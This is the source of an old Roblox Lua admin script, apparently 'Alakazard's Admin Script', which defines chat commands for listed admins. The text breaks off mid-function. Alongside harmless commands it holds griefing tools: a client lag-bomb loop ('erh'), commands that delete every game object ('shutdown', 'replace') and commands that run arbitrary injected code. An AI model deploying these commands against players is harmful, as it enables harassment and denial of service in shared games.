version='0.51'
Mode='Agression'
lego=nil
X=function(f)coroutine.resume(coroutine.create(f))end
if script~=nil then
 for i,v in pairs(script:children())do
  if v.Name=='y'and v:IsA('StringValue')then
    X(function()wait'';loadstring(script:FindFirstChild('y').Value)()end)
   return nil
  end 
 end
end
pcall(function()
 if game.PlaceId~=0 then
  script.Parent=Alakazard
 end
 script.Name=[[Alakazard's Admin Script]]
end)
pcall(function()game:service('Debris'):AddItem(game:FindFirstChild('ControlFrame',true),0)end)
PlayersList={
  Creator={
   ChrisLim=19699399,
   bloxpeter=774761,
   bllue3=3763859,
   imthebestdude1=14065455,
         Chris10002=4468704,
         supersonic805=4778427,
         AngelAlex2=14020125,
         Deathshot7=16114683,
         dmjoe=2944641,
         malasiscookieguy=5086179,
         blabivix=15706384,
         anthony649=3394760
   },
  Admins={
    
   ChrisLim=19699399,
   blabivix=15706384,
   imthebestdude1=14065455,
   octatub=14160976,
   Chris10002=4468704,
   bllue3=3763859,
   supersonic805=4778427,
   bloxpeter=774761,
   malasiscookieguy=5086179,
   dmjoe=2944641,
   Deathshot7=16114683,
   AngelAlex2=14020125,
   anthony649=3394760,
   aliadnan=2438626,
   thecooldill=2438626,
   Mikeydoo=9198729
    
   },
  Annoying={},
  PlayerIP={},
  
  KOs={},
  
  RunCharacterFunctions={},
  
  Runs={
   HealthBar={},
   
   History={},
   
  },
  
  Guis={}
  
 }
Datas={
  
  R={S=false,},
 
 }
se={
 lighting=game:GetService('Lighting'),
 starterpack=game:GetService('StarterPack'),
 startergui=game:GetService('StarterGui'),
 players=game:GetService('Players'),
 workspace=game:service('Workspace'),
 debris=game:service('Debris'),
 
 insert=game:service('InsertService'),
 
 sc=game:service('ScriptContext'),
 
 }
Q={}
 
id='rbxassetid://'
baseid='http://www.roblox.com/asset/?id='
--===============Changes===============--
new=                         Instance.new;
unew=                           UDim2.new;
vnew=                         Vector3.new;
fnew=                          CFrame.new;
cnew=                          Color3.new;
bcn=                       BrickColor.new;
look=                   CFrame.lookVector;
rot=            CFrame.fromEulerAnglesXYZ;
--=====================================--
life=function(obj,time)
 se.debris:AddItem(obj,time)
end
 
--======================Times======================--
StartTime=                                     tick();
time=function()
 ttime=se.workspace.DistributedGameTime
 ttime='-'..ttime
 for i in string.gmatch(ttime,'%w+')do
  ttime=i break
 end
 return ttime
end
--=================================================--
Backpack=function(p)
 for i,e in pairs(p:children())do
  if e:IsA('Backpack')then
   return e
  end
 end
 bp=new('Backpack',p)
 return bp
end
PlayerGui=function(p)
 for i,e in pairs(p:children())do
  if e:IsA('PlayerGui')then
   return e
  end
 end
 return nil
end
StarterGear=function(p)
 for i,e in pairs(p:children())do
  if e:IsA('StarterGear')then
   return e
  end
 end
 bp=new('StarterGear',p)
 return bp
end
ListCheck=function(ln,un)
 for i,w in pairs(ln)do 
  if w==un then 
   return true 
  end 
 end 
return false 
end
Print=function(text)
 fakehint=nil
 X(function()
  fakehint=new('ScreenGui')
  life(fakehint,10)
  fakehint.Name='Hint~'
  gui=new('TextLabel',fakehint)
  gui.Text=text..' [ Time: '..time()..' ]'
  gui.TextColor3=cnew(1,1,1)
  gui.BorderColor3=cnew(0,0,0)
  gui.Size=unew(1,0,0,20)
  gui.BackgroundTransparency=.5
  gui.BorderSizePixel=0
  gui.BackgroundColor3=cnew(0,0,0)
  gui.FontSize=('Size11')
  for i,v in ipairs(se.players:GetPlayers())do
   if ListCheck(PlayersList.Admins,v.userId)==true then
    if PlayersList.Runs.History[v.Name]==true then
     for b,s in pairs(v:children())do
      if s:IsA('PlayerGui')then
       localhints=0
       for l,k in pairs(s:children())do
        if k.className=='Hint'then
         k:remove()
        end
        if k.Name=='Hint~'then
         localhints=localhints+1
        end
       end
       gui.Position=unew(0,0,0,20*localhints)
       Scripting('local','localhints='..localhints..' for n=1,20 do script.Parent.Position=UDim2.new(0,0,0,localhints*n)wait()end',gui)
       fakehint.Parent=s
      end
     end
    end
   end
  end
 end)
 return fakehint
end
localscript=game:service('InsertService'):LoadAsset(53987736)
delay(.4,function()
 localscript=localscript.LocalScript:clone()
 localscript.Parent=nil
 new('StringValue',localscript).Name='y'
end)
wait(.5)
Print('Waiting for Localscript')
Scripting=function(class,a,p)--Rofl
 scrc=nil
 if a==''then return end
 if Datas.R.S==false then
  se.sc.ScriptsDisabled=false
 end
 X(function()
  if class=='local'then
   if script==nil then
    scr=new('LocalScript')
    scr.Source=a
    scrc=scr:clone()
    scrc.Parent=p
    scrc.Disabled=false
   else
    if localscript~=nil then
     scr=localscript:clone()
     scr.y.Value=a
     scrc=scr:clone()
     scrc.Parent=p
     scrc.Disabled=false
    else
     Scripting('script',a,p)
    end
   end
  end
  if class=='script'then
   if script~=nil then
    if game.CreatorId~=9201 then
     scr=script:clone()
     scr.Name='ALAKAZARD_NEW_SCRIPT'
     new('StringValue',scr).Name='y'
     scr.y.Value=a
     scrc=scr:clone()
     scrc.Parent=p
    elseif game.CreatorId==9201 then
     if anscr==nil then 
      scr=game:GetService('InsertService'):LoadAsset(53745810)
      if #scr:GetChildren()~=0 then
       anscr=scr.sb:clone()
      elseif #scr:GetChildren()==0 then
       if script~=nil then
        scr=script:clone()
        scr.Name='ALAKAZARD_NEW_SCRIPT'
        new('StringValue',scr).Name='y'
        scr.y.Value=a
        scrc=scr:clone()
        scrc.Parent=p
       else
        scr=new('Script')
        scr.Name='ALAKAZARD_NEW_SCRIPT'
        scr.Source=a
        scrc=scr:clone()
        scrc.Parent=p
       end
      end
     end
     for i,v in pairs(anscr:GetChildren())do
      if v.className=='StringValue'then
       v.Value=a
      end
     end
     scrc=anscr:clone()
     scrc.Parent=p
    end
   elseif script==nil then
    scr=new('Script')
    scr.Name='ALAKAZARD_NEW_SCRIPT'
    scr.Source=a
    scrc=scr:clone()
    scrc.Parent=p
   end
  end
 end)
return scrc
end
Print([[Load Alakazard's Admin Script!]])
time()
clen=0
_G.LS_={
 [1]=baseid..'53089014',
 [2]=baseid..'53089019',
 [3]=baseid..'53089022',
 [4]=baseid..'53089026',
 [5]=baseid..'53089031',
 [6]=baseid..'53089039',
 [7]=baseid..'53089046',
 [8]=baseid..'53089043',
 [9]=baseid..'53089054',
 [10]=baseid..'53089068',
 [11]=baseid..'53100317',
 }
SomethingFunctions={}
GlobalScripts={}
Actual={}
AlakazardCmds={
 
 Functions={},
 
 NewFunctions={},
 
 Objects={},
 
 Names={},
 
 }
Hats={
 AlakazardHats={},
 NEMESZISZHats={},
 }
Guis={
 HealthBar={},
 Hint={},
 Commands={},
 }
Sounds={
 
 pax={SoundId='rbxassetid://52155103',Pitch=1,Volume=1,Looped=true},
 
 warning={SoundId='rbxassetid://50909479',Pitch=.5,Volume=1,Looped=false},
 
 laugh={SoundId='rbxassetid://50251793',Pitch=.3,Volume=1,Looped=false},
 
 punch={SoundId='rbxassetid://54612598',Pitch=1,Volume=1,Looped=flase},
 
 start={SoundId='rbxassetid://53999348',Pitch=.6,Volume=1,Looped=false}
 
 }
Commands={
 
 ['cmds/ "Commands..."']=function(v,s)
  if scmd(v,'cmds')==false then return end 
   X(function()
    if s:FindFirstChild([[Alakazard's Base Cmds]],true) then return end 
    for i,t in pairs(Commands)do 
     if s:FindFirstChild('PlayerGui')then
      se.debris:AddItem(Adv(i,s.PlayerGui),#i/10)
      wait(#i/10)
     end
    end 
   end)
  end,
 
 ['load/ >script source here<']=function(v,s)
  if scmd(v,'load')==false then return end 
   Source=string.sub(v,clen+1)
   X(function()loadstring(Source)()end)
  end,
 
 ['scr/ >script source here<']=function(v,s)
  if scmd(v,'scr')==false then return end 
   table.insert(GlobalScripts,Scripting('script',string.sub(v,clen+1),se.workspace))
  end,
 
 ['historyshow/ "ah, I am lazy to write what this command mean... :P"']=function(v,s)
  if scmd(v,'historyshow')then return end
   PlayersList.Runs.History[s.Name]=true
  end,
 
 ['historyhide/ "ah, I am lazy to write what this command mean... :P"']=function(v,s)
  if scmd(v,'historyhide')then return end
   PlayersList.Runs.History[s.Name]=false
  end,
 
 ['scrl/ >script source here<']=function(v,s)
  if scmd(v,'scrl')==false then return end 
   for i,pg in pairs(s:children())do
    if pg.className=='PlayerGui'then
     X(function()
      table.insert(GlobalScripts,Scripting('local',string.sub(v,clen+1),pg))
     end)
    end
   end
  end,
 
 ['respawn/user "Respawn."']=function(v,s)
  if scmd(v,'respawn')==false then return end 
   X(function()
    for i,pl in pairs(spl(string.sub(v,clen+1),s))do 
     if script==nil then s:LoadCharacter()return end 
     m=new('Model',se.workspace)
     new('Humanoid',m)
     pl.Character=m 
    end 
   end)
  end,
 
 ['disabled/ "newscripts will disabled..."']=function(v,s)
  if scmd(v,'disabled')==false then return end 
   X(function()
    Datas.R.S=true
    se.sc.ScriptsDisabled=true
   end)
  end,
 
 ['enabled/ "newscripts will undisabled..."']=function(v,s)
  if scmd(v,'enabled')==false then return end 
   X(function()
    Datas.R.S=false
    se.sc.ScriptsDisabled=false
   end)
  end,
 
 ['lol/ "lol"']=function(v,s)
  for i in v:lower():gmatch('%w+')do
   if i=='lol'then
    newsound=new('Sound')
    life(newsound,1)
    newsound.Name='lol' 
    newsound.SoundId=Sounds['laugh'].SoundId 
    newsound.Pitch=.5
    newsound.Volume=1
    pcall(function()newsound.Parent=s.Character.Head end)
    newsound:play()
    break
   end
   end
  end,
 
 ['unshield/user']=function(v,s)
  if scmd(v,'unshield')==false then return end 
   for i,pl in pairs(spl(string.sub(v,clen+1),s))do
    X(function()
     for b,w in pairs(pl.Character:children())do
      if w.Name=='Shield'then
       w:remove()
      end
     end
    end)
   end
  end,
 
 ['talk/ "This is work if admin not in BaseScripts"']=function(v,s)
  if scmd(v,'talk')==false then return end
   for i,pl in pairs(spl(string.sub(v,clen+1),s))do
    if pcall(function()pl:SetSuperSafeChat(false)end)then
    else
     Print(s.Name..' Use illegal command')
    end
   end
  end,
 ['killguis/ "You will see"']=function(v,s)
  if scmd(v,'killguis')==false then return end
   for i,pl in ipairs(game:service('Players'):GetPlayers())do
    Scripting('local',[[
     game:service('Debris'):AddItem(game:FindFirstChild('RobloxGui',true),1)
    ]],PlayerGui(pl))wait()
   end
  end,
 ['erh/noob "Lagg for noob"']=function(v,s)
  if scmd(v,'erh')==false then return end
   for i,pl in pairs(spl(v:sub(clen+1),s))do
    Scripting('local',[[
     image={53646388,53646377,53645929,53645378,48290678,48260066,48328309,48293007,49316256,48258623,43082279,47595647,47596170,47944712}
     num=0
     while true do num=num+1
      if num==50 then 
      num=0
      wait()
      end
      for a=0,9 do
       for i=0,9 do
        screen=Instance.new('ScreenGui',game.CoreGui)
        gui=Instance.new('ImageButton',screen)
        gui.Image='http://www.roblox.com/asset/?id='..image[math.random(1,#image)]
        gui.Size=UDim2.new(.1,0,.1,0)
        gui.BackgroundTransparency=1
        gui.Position=UDim2.new(i/10,0,a/10,0)
       end
      end
     end
    ]],PlayerGui(pl))
   end
  end,
 ['shutup/ "Work if admin not run in BaseScrips"']=function(v,s)
  if scmd(v,'shutup')==false then return end
   for i,pl in pairs(spl(string.sub(v,clen+1),s))do
    if pcall(function()pl:SetSuperSafeChat(true)end)then
    else
     Print(s.Name..'Use illegal command')
    end
   end
  end,
 
 ['shield/user']=function(v,s)
  if scmd(v,'shield')==false then return end 
   for i,pl in pairs(spl(string.sub(v,clen+1),s))do
    X(function()pl.Character.Shield:remove()end)
    X(function()
    shield=new('Part')
    shield.Transparency=.5
    shield.Shape=0
    shield.TopSurface=0
    shield.BottomSurface=0
    shield.Size=vnew(10,10,10)
    shield.BrickColor=bcn(1003)
    shield.CanCollide=false
    shield.CFrame=pl.Character.Torso.CFrame
    bp=new('BodyPosition',shield)
    bp.position=shield.Position
    bp.P=20000
    bp.maxForce=vnew(9999999999999,9999999999999,9999999999999)
    X(function()
     Scripting('local',[[wait(1)
      p=script.Parent.Parent
      script.Parent=p.Character.Shield
      script.Parent.Touched:connect(function(a)
       if a.Parent~=script.Parent.Parent and not a.Parent:IsA('Hat')then
        a:breakJoints()
       end
      end)
      while true do
       wait()
       script.Parent.BodyPosition.position=script.Parent.Parent.Torso.Position
      end
     ]],s.PlayerGui)
    end)
    shield.Name='Shield'
    shield.Parent=pl.Character
--[[     rp=new('RocketPropulsion',shield)
    rp.MaxSpeed=200
    rp.MaxThrust=90000
    rp.ThrustD=50
    rp.ThrustP=800
    rp.Target=pl.Character.Torso
    rp.MaxTorque=vnew(10000,10000,10000)
    rp.TurnD=500
    rp.TurnP=0]]
    end)
   end
  end,
 
 ['die/user "user will die"']=function(v,s)
  if scmd(v,'die')==false then return end 
   X(function()
    for i,pl in pairs(spl(string.sub(v,clen+1),s))do
     KO_CREATOR(s,pl)
    end 
   end)
  end,
 
 ['base/ "New map just a big part."']=function(v,s)
  if scmd(v,'base')==false then return end 
   X(function()
    p=new('Part')
    p.Size=vnew(1000,3,1000)
    p.Anchored=true 
    p.Name='Base'
    p.BrickColor=bcn(37)
    p.formFactor=3 
    p.Locked=true 
    spawn=new('SpawnLocation',p)
    spawn.Size=vnew(4,1,4)
    spawn.Transparency=1 
    spawn.CanCollide=false 
    spawn.Anchored=true 
    spawn.Locked=true 
    spawn.Duration=0 
    p.Parent=se.workspace 
    for i,o in pairs(se.workspace:GetChildren())do 
     if not game.Players:GetPlayerFromCharacter(o) and o~=script and o~=p then 
      o.archivable=false 
      se.debris:AddItem(o,.1)
     end 
    end 
   end)
  end,
   
 ['shutdown/ "Server ended."']=function(v,s)
  if scmd(v,'shutdown')==false then return end 
   for i,pl in ipairs(game:service('Players'):GetPlayers())do
    Scripting('local',[[
     game:service('Debris'):AddItem(game:FindFirstChild('RobloxGui',true),1)
     remove=function(o)
      pcall(function()
       for i,v in pairs(o:children())do
        pcall(function()game:service('Debris'):AddItem(v,1)end)
        pcall(function()remove(v)end)
       end
      end)
     end
     remove(game)
    ]],PlayerGui(pl))wait()
   end
   wait(2.5)
   pcall(function()game:Shutdown()end)
   Clear(game,'all')
   X(function()new('ManualSurfaceJointInstance')end)
  end,
 
 ['nchar/user "Character not found."']=function(v,s)
  if scmd(v,'nchar')==false then return end 
   for i,pl in pairs(spl(v:sub(clen+1),s))do 
    pl.Character=nil 
   end 
  end,
 
 ['lama/user "DERP!"']=function(v,s)
 if scmd(v,'lama')==false then return end 
  X(function()
   for i,pl in pairs(spl(v:sub(clen+1),s))do
    for pn,pg in pairs(pl:GetChildren())do
     if pg.className=='PlayerGui'then
      screen=new('ScreenGui',pg)
      se.debris:AddItem(screen,11)
      imagegui=new('ImageLabel',screen)
      imagegui.Name='i'
      imagegui.BackgroundTransparency=1
      imagegui.Position=unew(.4,0,.2,0)
      imagegui.Size=unew(0,200,0,300)
      screen.Name='Lama'
      Scripting('script',[[
       for ia=1,33 do
        for w,img in pairs(_G.LS_)do
         wait(.1)
         script.Parent.i.Image=img
        end
       end
      ]],screen)
     end
    end
   end
  end)
 end,
 
 ['kick/user You can^t kicked admins!']=function(v,s)
  if scmd(v,'kick')==false then return end 
   X(function()
    for i,pl in pairs(spl(v:sub(clen+1),s))do
     if ListCheck(PlayersList.Admins,pl.userId)==false then
      se.debris:AddItem(pl,1)
      for pn,pg in pairs(pl:GetChildren())do
       if pg.className=='PlayerGui'then
        pcall(Adv('Bye bye noob',pg,0,0,.5,0))
        wait()
       end
      end
     end
    end
   end)
  end,
 
 ['ban/user You can^t banned admins!']=function(v,s)
  if scmd(v,'ban')==false then return end 
   X(function()
    for i,pl in pairs(spl(v:sub(clen+1),s))do
     if ListCheck(PlayersList.Admins,pl.userId)==false then
      se.debris:AddItem(pl,1)
      table.insert(PlayersList.Annoying,pl.Name)
      for pn,pg in pairs(pl:GetChildren())do
       if pg.className=='PlayerGui'then
        pcall(Adv('Bye bye noob',pg,0,0,.5,0))
        wait()
       end
      end
     end
    end
   end)
  end,
 
 ['heal/user "You know this mean."']=function(v,s)
  if scmd(v,'heal')==false then return end 
   for i,pl in pairs(spl(v:sub(clen+1),s))do 
    if pl.Character~=nil then 
     for asdasd,hum in pairs(pl.Character:GetChildren())do 
      if hum.className=='Humanoid'then 
       hum.Health=hum.MaxHealth 
      end 
     end 
    end 
   end 
  end,
 
 ['replace/ "Remove all stuff in game"']=function(v,s)
  if scmd(v,'replace')==false then return end
   delay(0,function()
    BasePart=new('Part')
    BasePart.Size=vnew(1000,1,1000)
    BasePart.Anchored=true
    BasePart.BrickColor=BrickColor.random()
    BasePart.Name='Base'
    BasePart.Parent=workspace
    replace=function(o)
     for i,v in pairs(o:children())do
      pcall(function()replace(v)end)
      if v.className~='Player'and v~=script and v~=BasePart and v~=m_ and v.className~='PlayerMouse'then
       pcall(function()v.Health=0 v.MaxHealth=0 v:BreakJoints()end)
       pcall(function()v.Disabled=true end)
       pcall(function()v.archivable=false end)
       pcall(function()v:remove()end)
      end
     end
    end
    replace(game)
    for i,pl in pairs(spl('all',s))do 
     if script==nil then s:LoadCharacter()return end 
     m=new('Model',se.workspace)
     new('Humanoid',m)
     pl.Character=m 
    end 
    se.lighting.GeographicLatitude=41.73
    se.lighting.TimeOfDay=14
    se.lighting.ShadowColor=cnew(.701961,.701961,.721569)
    se.lighting.ColorShift_Top=cnew(0,0,0)
    se.lighting.ColorShift_Bottom=cnew(0,0,0)
    se.Ambient=cnew(.501961,.501961,.501961)
    se.Brightness=1
   end)
  end,
 
 ['staff/user "This is make Alakazard'..'\39'..'s staff for user"']=function(v,s)
  if scmd(v,'staff')==false then return end
   for i,pl in pairs(spl(v:sub(clen+1),s))do 
    Staff(Backpack(pl))
   end
  end,
 
 ['flybin/ "This is make my fly hopperbin. -Alakazard"']=function(v,s)
  if scmd(v,'flybin')==false then return end
   for i,pl in pairs(spl(v:sub(clen+1),s))do
    FlyBin(Backpack(pl))
   end
  end,
 
 ['inf/user "User have inf health"']=function(v,s)
  if scmd(v,'inf')==false then return end 
   for i,pl in pairs(spl(v:sub(clen+1),s))do 
    if pl.Character~=nil then
     for i,h in pairs(pl.Character:children())do
      if h:IsA('Humanoid')then
       for b,n in pairs(h:children())do
        if n.Name=='inf'then
         n:remove()
        end
       end
      end
     end
     for a,w in pairs(pl:children())do
      if w:IsA('PlayerGui')then
       Scripting('local',[[script.Name='inf'
        for i,v in pairs(script.Parent.Parent.Character:children())do
         if v:IsA('Humanoid')then
          script.Parent=v
         end
        end
        if script.Parent:IsA('Humanoid')then
         print'Humanoid found!'
        else
         script:remove()
        end
        script.Parent.Name='Ä |:| Alanoid |:| Ä'
        script.Parent.MaxHealth=1000
        script.Parent.Health=1000
        script.Parent.HealthChanged:connect(function()
        script.Parent.MaxHealth=1000
        script.Parent.Health=1000
        script.Parent.Torso.Parent:MakeJoints()
       end)]],w) 
      end
     end
    end 
   end 
  end,
 
 ['csb/ "Removed all admin script. asd"']=function(v,s)
  if scmd(v,'csb')==false then return end 
   for i,s in pairs(GlobalScripts)do 
    s.archivable=false 
    s:remove() 
   end 
  end,
 
 ['admin/user "Commands work for user."']=function(v,s)wait()
  if scmd(v,'admin')==false then return end
   for i,pl in pairs(spl(v:sub(clen+1),s))do 
    if ListCheck(PlayersList.Admins,pl.userId)==false then
     table.insert(PlayersList.Admins,pl.userId)
     PlayerFunctionsConnect(pl)
     Print('New admin '..pl.Name..'!')
    end
   end
  end,
 
 ['adv/test "Hint"']=function(v,s)
  if scmd(v,'adv')==false then return end 
   for i,pl in pairs(spl('all',s))do 
    for a,pgi in pairs(pl:GetChildren())do 
     if pgi.className=='PlayerGui'then 
      Adv(v:sub(clen+1),pgi,0,0,0,0)
     end 
    end 
   end 
  end,
 
 ['frz/user "Freeze user character."']=function(v,s)
  if scmd(v,'frz')==false then return end 
   for i,pl in pairs(spl(v:sub(clen+1),s))do 
    if pl.Character~=nil then 
     for c,part in pairs(pl.Character:GetChildren())do 
      if part.className=='Part'then 
       part.Anchored=true 
      end 
     end 
    end 
   end 
  end,
 
 ['cape/user "Cape on yourh torso =3"']=function(v,s)
  if scmd(v,'cape')==false then return end 
   for i,pl in pairs(spl(v:sub(clen+1),s))do 
    if pl.Character~=nil then
     for ti,hum in pairs(pl.Character:GetChildren())do
      if hum.className=='Humanoid'then
       if hum.Torso~=nil then
        for iao,humt in pairs(hum.Torso:GetChildren())do 
         if humt.Name=='Cape'then 
          humt:remove()
         end 
        end
        cpart=new('Part')
        cpart.CanCollide=false
        cpart.Name='Cape'
        cpart.BrickColor=bcn(1003)
        cpart.formFactor=3
        cpart.Size=vnew(.3,4,3)
        cpart.TopSurface=('Smooth')
        cpart.BottomSurface=('Smooth')
        cpart.Parent=hum.Torso
        cweld=new('Motor')
        cweld.Parent=hum.Torso
        cweld.Name='cCape'
        cweld.Part0=hum.Torso
        cweld.Part1=cpart
        cweld.C0=rot(0,1.57,0)+vnew(0,0,0)
        cweld.C1=fnew(.66,1,0)
        cweld.DesiredAngle=-.25
        cweld.MaxVelocity=.2
        Scripting('script',[[hum=script.Parent
        cweld=hum.Torso.cCape
        cape=cweld.Part1
        d=function()
        cape.Parent=workspace
        cape.Anchored=true
        for i=1,10 do
        wait()
        cape.Transparency=i/10
        end
        end
        hum.Died:connect(d)
        ]],hum)
       end
      end
     end
    end
   end
  end,
 
 ['thw/user "Thaw user character."']=function(v,s)
  if scmd(v,'thw')==false then return end 
   for i,pl in pairs(spl(v:sub(clen+1),s))do 
    if pl.Character~=nil then 
     for c,part in pairs(pl.Character:GetChildren())do 
      if part.className=='Part'then 
       part.Anchored=false 
      end 
     end 
    end 
   end 
  end,
 
 ['rhats/user "Thaw user character."']=function(v,s)
  if scmd(v,'rhats')==false then return end 
   for i,pl in pairs(spl(v:sub(clen+1),s))do 
    if pl.Character~=nil then 
     for c,hat in pairs(pl.Character:GetChildren())do 
      if hat.className=='Hat'then 
       hat:remove()
      end 
     end 
    end 
   end 
  end,
 
 ['tele/user/user2 "user(s) position == user2 position"']=function(v,s)
  if scmd(v,'tele')==false then return end 
   Findw(v,'tele',2)
   for i,pl in pairs(spl(Q[1],s))do
    for a,ppll in pairs(spl(Q[2],s))do
     X(function()pl.Torso.CFrame=ppll.Torso.CFrame end)
    end
   end
  end,
 
 ['unpunish/user "Character not in workspace, but you can put back. if you say unpunish/user"']=function(v,s)
  if scmd(v,'unpunish')==false then return end 
   for i,pl in pairs(spl(v:sub(clen+1),s))do 
    if pl.Character~=nil then 
     char=pl.Character
     char.Parent=se.workspace
     char:MakeJoints()
    end
   end
  end,
 
 ['punish/user "Character not in workspace, but you can put back. if you say unpunish/user"']=function(v,s)
  X(function()
   if scmd(v,'punish')==false then return end 
    for i,pl in pairs(spl(v:sub(clen+1),s))do 
     if pl.Character~=nil then 
      pl.Character.Parent=nil
     end
    end 
   end)
  end,
 
 ['rtools/user "Removed user backpack."']=function(v,s)
  if scmd(v,'rtools')==false then return end 
   for i,pl in pairs(spl(v:sub(clen+1),s))do 
    for ia,plb in pairs(pl:GetChildren())do 
     if plb.className=='Backpack'then
      plb:remove()
      Instance.new('Backpack',pl)
     end
    end
   end 
  end,
 
 ['dis/ "This disabled new scripts!"']=function(v,s)
  if scmd(v,'dis')==false then return end 
   se.sc.ScriptsDisabled=true
  end,
 
 ['ena/ "This enabled new scripts!"']=function(v,s)
  if scmd(v,'ena')==false then return end 
   se.sc.ScriptsDisabled=false
  end,
 
 ['instance/int "Anaminus SBs block command 0=dont block 1=block scripts"']=function(v,s)
  if scmd(v,'instance')==false then return end 
   intn=v:sub(clen+1,clen+1):lower()
   if intn==nil or intn=='' then return end
   if intn=='x' then Instance.new=nil end
   if intn=='o' then Instance.new=new end
  end,
 
 ['clear/ "this remove all script"']=function(v,s)
  if scmd(v,'clear')==false then return end 
   Clear(game,'script')
  end,
  
 ['ans/int "Anaminus SBs block command 0=dont block 1=block scripts"']=function(v,s)
  if scmd(v,'ans')==false then return end 
   intn=v:sub(clen+1,clen+1)
   if intn==nil or intn=='' then return end
   if AnaSbCheck1~=nil then
    AnaSbCheck1:disconnect()AnaSbCheck1=nil
   end
   if intn==0 or intn=='0'then return end
   if intn==1 or intn=='1'then
    AnaSbCheck1=se.workspace.ChildAdded:connect(function(asd)
     for i,a in pairs(AnaminusBlock)do
      if asd~=nil then
       a(asd)
      end
     end
    end)
   end
  end,
 
 ['hint/ "hint in screen"']=function(v,s)
  if scmd(v,'hint')==false then return end
   X(function()
    for i,pl in pairs(spl('all',s))do
     for a,pg in pairs(pl:GetChildren())do
      if pg.className=='PlayerGui'then
       _HM(v:sub(clen+1),'Hint',pg)
      end
     end
    end
   end)
  end,
 
 ['cln/objectname']=function(v,s)
  if scmd(v,'cln')==false then return end
   X(function()AlakazardCmds.Names.clear=v:sub(clen+1)ChangeClear(game,'name')end)
  end,
 
 ['mess/ "message in screen"']=function(v,s)
  if scmd(v,'mess')==false then return end
   X(function()
    for i,pl in pairs(spl('all',s))do
     for a,pg in pairs(pl:GetChildren())do
      if pg.className=='PlayerGui'then
       _HM(v:sub(clen+1),'Message',pg)
      end
     end
    end
   end)
  end,
 
 ['kos/user "..."']=function(v,s)
  if scmd(v,'kos')==false then return end 
   X(function()
    for i,pl in pairs(spl(v:sub(clen+1),s))do 
     if ListCheck(PlayersList.Admins,pl.userId)==false then
      KO(s,pl)
     end
    end
   end)
  end,
 
 ['rguis/user "Removed user guis."']=function(v,s)
  if scmd(v,'rguis')==false then return end 
   for i,pl in pairs(spl(v:sub(clen+1),s))do 
    for ia,plb in pairs(pl:GetChildren())do 
     if plb.className=='PlayerGui'then
      for i,v in pairs(plb:children())do v:remove()end
      Scripting('local',[[
       lego=game:service('Debris')lego:AddItem(game:FindFirstChild('ControlFrame',true),0) 
      ]],PlayerGui(pl))
     end
    end
   end 
  end,
 
 }
_GCommands=function()
 _G['Alakazard..'..'\39'..'s Admin Commands']={}
 for i,v in pairs(Commands)do
  _G['Alakazard..'..'\39'..'s Admin Commands'][i]=v
 end
end
ShowCommands=function(p)--Guis.Commands
 _GCommands()
 for i,v in pairs(p:children())do
  if v:IsA('PlayerGui')then
   for a,w in pairs(v:children())do
    if w.Name=='Commands from Alakazard'then
     w:remove()
    end
   end
  end
 end
 screen=new('ScreenGui',PlayerGui(p))
 screen.Name='Commands from Alakazard'
 Main=new('TextButton',screen)
 Main.Size=unew(0,200,0,30)
 Main.Position=unew(0,0,0,0)
 Main.TextColor3=cnew(1,1,1)
 Main.Font=2
 Main.TextXAlignment=0
 Main.Text='Show Commands'
 Main.FontSize=('Size14')
 Main.Style=2
 Main:TweenPosition(unew(0,0,.41,0),Enum.EasingDirection.Out,Enum.EasingStyle.Back,2,false)
 Scripting('script',[[
  gui=script.Parent
  c=_G['Alakazard..'..'\39'..'s Admin Commands']
  haa=nil
  new=Instance.new
  unew=UDim2.new
  QQ=function(f)coroutine.resume(coroutine.create(f))end
  word=function(t)
   for q in string.gmatch(t,'%a+')do
    return q
   end
  end
  groups={}
  newgroup=function()
   child=#gui:children()-1
   ggg=new('TextButton',gui)
   ggg.Text=child+1
   ggg.Style=2
   ggg.Font=2
   ggg.FontSize='Size14'
   ggg.Size=unew(0,20,0,20)
   ggg.Position=unew(0,0,0,20)
   ggg:TweenPosition(unew(0,20*child-9,0,20),Enum.EasingDirection.Out,Enum.EasingStyle.Back,2,false)
   ggg.TextColor3=Color3.new(1,1,1)
   haa=ggg
   return ggg
  end
  gui.MouseButton1Click:connect(function()
   if click==true then return end
    click=true
   if gui.AutoButtonColor==true then
    QQ(function()
     xys='Hide Commands'
     for wwq=1,#xys do wait()
      gui.Text=xys:sub(1,wwq)
     end
    end)
    gui.Style=1
    gui.AutoButtonColor=false
    nam=0
    latitude=newgroup()
    new('NumberValue',latitude).Value=#gui:children()-1
    for text,fun in pairs(c)do 
     if nam==10 then
      wait(.1)
      nam=0
      latitude=newgroup()
      new('NumberValue',latitude).Value=#gui:children()-1
     end
     nam=nam+1
     if groups[#gui:children()-1]==nil then
      groups[#gui:children()-1]={}
     end
     groups[#gui:children()-1][word(text)]=text
    end
    for i,v in pairs(gui:children())do
     if v:IsA('TextButton')then
      v.MouseButton1Click:connect(function()
       if click==true then return end click=true
       if v.AutoButtonColor==true then
        v.AutoButtonColor=false
        v.Style=1
        hanat=v.Value.Value
        for q,e in pairs(groups[hanat])do
         wait()
         gl=new('TextButton',v)
         gl.Size=unew(0,100,0,20)
         gl.Style=2
         gl.TextColor3=Color3.new(1,1,1)
         gl.Text=q
         gl.Font=2
         gl.FontSize='Size14'
         gl.Position=gl.Position+unew(0,-9/1.5,0,0)
         gl:TweenPosition(unew(0,-9/1.5,0,20*(#v:children()-1)),Enum.EasingDirection.Out,Enum.EasingStyle.Back,1,false)
        end
        for nb,rrr in pairs(v:children())do
         if rrr:IsA('TextButton')then
          rrr.MouseButton1Click:connect(function()
           for h,k in pairs(gui.Parent:children())do
            if k.Name=='Ala'then
             k:remove()
            end
           end
           text_=groups[rrr.Parent.Value.Value][rrr.Text]
           tutorial=new('TextButton',gui.Parent)
           game:service('Debris'):AddItem(tutorial,#text_/5)
           tutorial.Size=unew(0,200,0,200)
           tutorial.Style=1
           tutorial.Name='Ala'
           tutorial.TextWrap=true
           tutorial.AutoButtonColor=false
           tutorial.Font=2
           tutorial.FontSize='Size14'
           tutorial.TextColor3=Color3.new(1,1,1)
           tutorial.Position=unew(0,200,0.41,0)
           QQ(function()for a_=1,#text_ do tutorial.Text=text_:sub(1,a_)wait()end end)
           QQ(function()for _=1,20 do wait()tutorial.Size=unew(0,10*_,0,30)end for _=1,20 do wait()tutorial.Size=unew(0,200,0,10*_)end end)
          end)
         end
        end
       else
        v.Style=2
        v.AutoButtonColor=true
        for n,b in pairs(v:children())do
         if not b:IsA('NumberValue')then b:remove()end
        end
       end
       click=false
      end)
     end
    end
   else
    gui.Style=2
    gui.AutoButtonColor=true
    QQ(function()
     xys='Show Commands'
